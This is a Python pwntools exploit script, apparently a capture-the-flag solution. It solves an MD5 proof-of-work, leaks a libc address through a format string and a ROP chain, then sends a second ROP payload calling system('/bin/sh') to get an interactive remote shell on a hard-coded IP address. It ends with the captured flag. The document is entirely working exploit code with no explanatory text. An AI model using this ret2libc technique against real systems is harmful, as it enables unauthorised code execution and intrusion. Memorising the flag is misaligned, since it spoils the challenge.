
from pwn import *
import itertools
import string
import hashlib

context.update(arch="amd64", endian="little", os="linux", log_level="info",)

s = {}

for i in itertools.permutations(string.ascii_lowercase,4):
    str2hash = ''.join(i)
    result = hashlib.md5(str2hash.encode())
    s[str2hash] = result.hexdigest()[-6:]

r = remote('185.172.165.118', 2222)
# r = remote('172.17.0.2', 1234)

x = r.readline().split()[-1].decode()

for k,v in s.items():
    if v == x:
        break

r.sendline(k)
print(r.recv())
r.readline()
r.readline()

pop_rdi = 0x401263 #: pop rdi; ret;
ret = 0x40101a #: ret;

p = b' %3$p '.rjust(40,b'A')
p += p64(pop_rdi)
p += p64(0x404018)
p += p64(0x401030)
p += p64(0x4011B7)

libc = ELF('./libc.so.6', checksec=False)

ssss = libc.sym['_IO_2_1_stdin_']

r.sendline(p)
leak = int(r.recv().split()[1], 16)

LIBC_BASE = leak - ssss
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

p = b'B' * 40
p += p64(ret)
p += p64(pop_rdi) 
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()

# flag{w3_d0n't_n33d_n0_rdx_g4dg3t,ret2csu_15_d3_w4y_7821243}